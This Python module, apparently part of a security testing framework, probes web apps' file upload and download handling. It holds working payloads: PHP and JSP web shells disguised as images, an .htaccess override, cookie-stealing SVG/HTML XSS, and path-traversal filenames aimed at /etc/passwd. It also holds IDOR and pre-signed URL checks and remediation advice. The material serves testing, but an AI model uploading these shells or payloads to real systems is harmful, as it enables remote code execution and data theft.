"""
BugKit v4 — File Upload / Download Security Tester

Tests file handling for:
  1. Upload IDOR — can userB access/delete userA's uploaded files?
  2. Path traversal in filename
  3. Content-Type bypass (upload PHP as image)
  4. Stored XSS via SVG / HTML upload
  5. Pre-signed URL abuse (sharing between tenants)
  6. File enumeration via sequential IDs
  7. Unrestricted file type upload
  8. Large file / zip-bomb DoS (size only, no actual bomb)
  9. Metadata / EXIF exposure check
  10. Direct object reference in download URL
"""
from __future__ import annotations

import io
import re
from typing import List
from urllib.parse import urljoin

from core.session import BugKitSession
from core import logger
from engines.object_mutator import ObjectMutator
from db import queries


# Common upload endpoint paths
UPLOAD_PATHS = [
    "/api/upload",
    "/api/files",
    "/api/v1/upload",
    "/api/v1/files",
    "/api/v2/upload",
    "/api/v2/files",
    "/upload",
    "/files",
    "/media/upload",
    "/documents/upload",
    "/attachments",
    "/api/attachments",
    "/api/documents",
    "/api/media",
    "/api/avatars",
    "/profile/avatar",
]

# Dangerous content-type bypass attempts
BYPASS_UPLOADS = [
    # (filename, content, content_type, description)
    ("shell.php.jpg",    b"<?php system($_GET['cmd']); ?>",
     "image/jpeg",       "PHP shell disguised as JPEG"),
    ("xss.svg",         b'<svg><script>alert(document.cookie)</script></svg>',
     "image/svg+xml",    "SVG stored XSS"),
    ("xss.html",        b'<script>alert(document.cookie)</script>',
     "text/html",        "HTML stored XSS"),
    ("test.php",        b"<?php phpinfo(); ?>",
     "application/octet-stream", "PHP file direct upload"),
    (".htaccess",       b"AddType application/x-httpd-php .jpg",
     "text/plain",       ".htaccess override"),
    ("../../../etc/passwd", b"root:x:0:0:root",
     "text/plain",       "Path traversal filename"),
    ("test.jsp",        b"<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>",
     "text/plain",       "JSP shell upload"),
]

# Filename-based path traversal attempts
TRAVERSAL_FILENAMES = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\system.ini",
]


class FileTester:
    """
    File upload / download security tester.

    Usage:
        tester = FileTester(session)
        tester.run(target_id=1, base_url="https://app.example.com", identity="userA")
    """

    def __init__(self, session: BugKitSession) -> None:
        self.session   = session
        self._findings = 0

    def run(
        self,
        target_id: int,
        base_url:  str,
        identity:  str = None,
    ) -> int:
        logger.section(f"File Upload/Download Tester  →  {base_url}")
        self._tid      = target_id
        self._base     = base_url.rstrip("/")
        self._identity = identity
        self._findings = 0

        upload_eps = self._discover_upload_endpoints()
        if not upload_eps:
            logger.info("No file upload endpoints found.")
            return 0

        logger.ok(f"Found {len(upload_eps)} upload endpoint(s)")

        for ep in upload_eps:
            self._test_content_type_bypass(ep)
            self._test_traversal_filename(ep)

        self._test_download_idor(target_id)
        self._test_cross_identity_access(upload_eps, target_id)
        self._test_presigned_url_abuse(target_id)
        self._test_file_enumeration(upload_eps)

        logger.section("File Tests Summary")
        logger.ok(f"Findings: {self._findings}")
        return self._findings

    # ── Discovery ──────────────────────────────────────────────────────

    def _discover_upload_endpoints(self) -> List[str]:
        db_eps = [
            ep.url for ep in queries.get_endpoints(self._tid)
            if any(kw in ep.url.lower() for kw in
                   ["upload","file","document","media","attachment","avatar","image"])
        ]
        heuristic = [self._base + p for p in UPLOAD_PATHS]
        candidates = list(dict.fromkeys(db_eps + heuristic))

        active = []
        for url in candidates[:20]:
            resp = self.session.get(url, capture=False)
            if resp and resp.status_code not in (404, 410):
                active.append(url)
        return active

    # ── Test 1: Content-Type bypass ────────────────────────────────────

    def _test_content_type_bypass(self, upload_url: str) -> None:
        logger.info(f"Testing content-type bypass: {upload_url}")

        for filename, content, mime_type, description in BYPASS_UPLOADS:
            file_obj = io.BytesIO(content)
            files    = {"file": (filename, file_obj, mime_type)}

            resp = self.session.request(
                "POST", upload_url,
                files         = files,
                identity_name = self._identity,
                capture       = True,
            )
            if resp is None:
                continue

            if resp.status_code in (200, 201):
                # Check if server returned a URL to the uploaded file
                url_pattern = re.search(
                    r'(https?://[^\s"\'<>]+(?:php|html|svg|jsp|htaccess)[^\s"\'<>]*)',
                    resp.text, re.I
                )
                file_url = url_pattern.group(1) if url_pattern else ""

                cap = self.session.last_capture
                self._save(
                    title     = f"File Upload — {description}: {filename}",
                    url       = upload_url,
                    severity  = "CRITICAL" if "php" in filename.lower() or "jsp" in filename else "HIGH",
                    confidence= "high" if file_url else "medium",
                    detail    = (
                        f"{description}.\n"
                        f"File `{filename}` uploaded successfully with MIME `{mime_type}`.\n"
                        f"Uploaded URL: {file_url or 'check response'}"
                    ),
                    evidence  = (
                        f"Filename: {filename}\n"
                        f"MIME: {mime_type}\n"
                        f"HTTP: {resp.status_code}\n"
                        f"File URL: {file_url}\n"
                        f"Response: {resp.text[:300]}"
                    ),
                    raw_req   = cap.raw_request  if cap else "",
                    raw_resp  = cap.raw_response[:2000] if cap else "",
                    curl      = cap.curl         if cap else "",
                    tags      = ["file-upload", "content-type-bypass", "rce"],
                    cwe       = "CWE-434",
                    cvss      = 9.8 if "php" in filename.lower() else 7.5,
                )

    # ── Test 2: Path traversal filename ───────────────────────────────

    def _test_traversal_filename(self, upload_url: str) -> None:
        logger.info(f"Testing filename path traversal: {upload_url}")

        for filename in TRAVERSAL_FILENAMES:
            file_obj = io.BytesIO(b"traversal test")
            files    = {"file": (filename, file_obj, "text/plain")}

            resp = self.session.request(
                "POST", upload_url,
                files         = files,
                identity_name = self._identity,
                capture       = True,
            )
            if resp and resp.status_code in (200, 201):
                resp_text = resp.text
                # Check if the server reveals a file path that includes traversal
                if re.search(r'(etc/passwd|windows/system\.ini|\.\.)', resp_text, re.I):
                    cap = self.session.last_capture
                    self._save(
                        title     = "File Upload — Path Traversal in Filename",
                        url       = upload_url,
                        severity  = "CRITICAL",
                        confidence= "high",
                        detail    = (
                            f"Traversal filename `{filename}` accepted and "
                            "server response contains traversal indicators."
                        ),
                        evidence  = f"Filename: {filename}\nResponse: {resp_text[:400]}",
                        raw_req   = cap.raw_request  if cap else "",
                        raw_resp  = cap.raw_response[:2000] if cap else "",
                        curl      = cap.curl         if cap else "",
                        tags      = ["file-upload", "path-traversal", "lfi"],
                        cwe       = "CWE-22",
                        cvss      = 9.1,
                    )
                    break

    # ── Test 3: Download IDOR ──────────────────────────────────────────

    def _test_download_idor(self, target_id: int) -> None:
        logger.info("Testing file download IDOR…")
        # Use ObjectMutator on file-related endpoints from DB
        file_eps = [
            ep for ep in queries.get_endpoints(target_id)
            if any(kw in ep.url.lower() for kw in
                   ["file","download","document","media","attachment"])
        ]
        mutator = ObjectMutator(self.session)
        for ep in file_eps[:10]:
            results     = mutator.sweep("GET", ep.url)
            finding_ids = mutator.save_findings(results, target_id)
            self._findings += len(finding_ids)

    # ── Test 4: Cross-identity access ─────────────────────────────────

    def _test_cross_identity_access(
        self, upload_eps: List[str], target_id: int
    ) -> None:
        if len(self.session.identity_names) < 2:
            return
        logger.info("Testing cross-identity file access…")

        id_a = self.session.identity_names[0]
        id_b = self.session.identity_names[1]

        for upload_url in upload_eps[:3]:
            # Upload as userA
            file_obj = io.BytesIO(b"userA private file content")
            files    = {"file": ("test_a.txt", file_obj, "text/plain")}
            resp_a   = self.session.request(
                "POST", upload_url,
                files         = files,
                identity_name = id_a,
                capture       = False,
            )
            if resp_a is None or resp_a.status_code not in (200, 201):
                continue

            # Extract file URL or ID from response
            file_url = self._extract_file_url(resp_a.text, upload_url)
            if not file_url:
                continue

            # Try to access as userB
            resp_b = self.session.request(
                "GET", file_url,
                identity_name = id_b,
                capture       = True,
            )
            if resp_b and resp_b.status_code == 200:
                if b"userA private file content" in resp_b.content:
                    cap = self.session.last_capture
                    self._save(
                        title     = f"File IDOR — Cross-User File Access: {file_url}",
                        url       = file_url,
                        severity  = "HIGH",
                        confidence= "high",
                        detail    = (
                            f"File uploaded by '{id_a}' accessible by '{id_b}'. "
                            f"URL: {file_url}"
                        ),
                        evidence  = f"File URL: {file_url}\nContents visible to {id_b}",
                        raw_req   = cap.raw_request  if cap else "",
                        raw_resp  = cap.raw_response[:2000] if cap else "",
                        curl      = cap.curl         if cap else "",
                        tags      = ["file-idor", "access-control", "bola"],
                        cwe       = "CWE-639",
                        cvss      = 8.1,
                    )

    # ── Test 5: Pre-signed URL abuse ───────────────────────────────────

    def _test_presigned_url_abuse(self, target_id: int) -> None:
        logger.info("Testing pre-signed URL abuse…")
        if len(self.session.identity_names) < 2:
            return

        presigned_eps = [
            ep.url for ep in queries.get_endpoints(target_id)
            if any(kw in ep.url.lower() for kw in
                   ["presigned","signed","download-url","share","token"])
        ]
        for ep in presigned_eps[:5]:
            # Get a signed URL as userA
            resp_a = self.session.request(
                "GET", ep,
                identity_name = self.session.identity_names[0],
                capture       = False,
            )
            if resp_a is None or resp_a.status_code != 200:
                continue
            try:
                signed_url = resp_a.json().get("url", "")
            except Exception:
                continue
            if not signed_url:
                continue

            # Access signed URL as userB (no auth)
            self.session.as_guest()
            resp_b = self.session.request("GET", signed_url, capture=True)
            if self.session._active_id:
                self.session.use(self.session._active_id)

            if resp_b and resp_b.status_code == 200:
                cap = self.session.last_capture
                self._save(
                    title     = f"File — Pre-signed URL Accessible Without Auth: {ep}",
                    url       = signed_url,
                    severity  = "MEDIUM",
                    confidence= "high",
                    detail    = (
                        f"Pre-signed URL from {ep} accessible without credentials. "
                        "Verify expiry time and whether URL is guessable."
                    ),
                    evidence  = f"Signed URL: {signed_url[:200]}\nHTTP {resp_b.status_code}",
                    raw_req   = cap.raw_request  if cap else "",
                    raw_resp  = cap.raw_response[:2000] if cap else "",
                    curl      = cap.curl         if cap else "",
                    tags      = ["presigned-url", "file", "access-control"],
                    cwe       = "CWE-284",
                    cvss      = 5.4,
                )

    # ── Test 6: File enumeration ───────────────────────────────────────

    def _test_file_enumeration(self, upload_eps: List[str]) -> None:
        logger.info("Testing sequential file ID enumeration…")
        mutator = ObjectMutator(self.session)
        for ep in upload_eps[:5]:
            results = mutator.sweep("GET", ep)
            finding_ids = mutator.save_findings(results, self._tid)
            self._findings += len(finding_ids)

    # ── Helpers ────────────────────────────────────────────────────────

    def _extract_file_url(self, response_text: str, base_url: str) -> str:
        patterns = [
            r'"url"\s*:\s*"([^"]+)"',
            r'"file_url"\s*:\s*"([^"]+)"',
            r'"download_url"\s*:\s*"([^"]+)"',
            r'"path"\s*:\s*"([^"]+)"',
            r'href="([^"]+(?:uploads|files|media)[^"]+)"',
        ]
        for pat in patterns:
            m = re.search(pat, response_text)
            if m:
                url = m.group(1)
                if url.startswith("http"):
                    return url
                return urljoin(base_url, url)
        return ""

    def _save(
        self,
        title:      str,
        url:        str,
        severity:   str,
        confidence: str,
        detail:     str,
        evidence:   str,
        raw_req:    str,
        raw_resp:   str,
        curl:       str,
        tags:       list,
        cwe:        str,
        cvss:       float,
    ) -> None:
        queries.save_finding(
            target_id    = self._tid,
            module       = "files",
            title        = title,
            severity     = severity,
            confidence   = confidence,
            url          = url,
            method       = "POST",
            detail       = detail,
            evidence     = evidence,
            raw_request  = raw_req,
            raw_response = raw_resp,
            curl_poc     = curl,
            impact       = (
                "Unrestricted file upload can lead to remote code execution. "
                "File IDOR enables cross-user data access and exfiltration."
            ),
            remediation  = (
                "Validate file type by magic bytes, not extension or Content-Type. "
                "Store files outside webroot. Serve via a dedicated file API. "
                "Enforce server-side ownership on every download request. "
                "Use random UUIDs as file identifiers, never sequential IDs."
            ),
            cwe  = cwe,
            cvss = cvss,
            tags = tags,
        )
        self._findings += 1
        logger.finding(title=title, severity=severity, url=url, confidence=confidence)
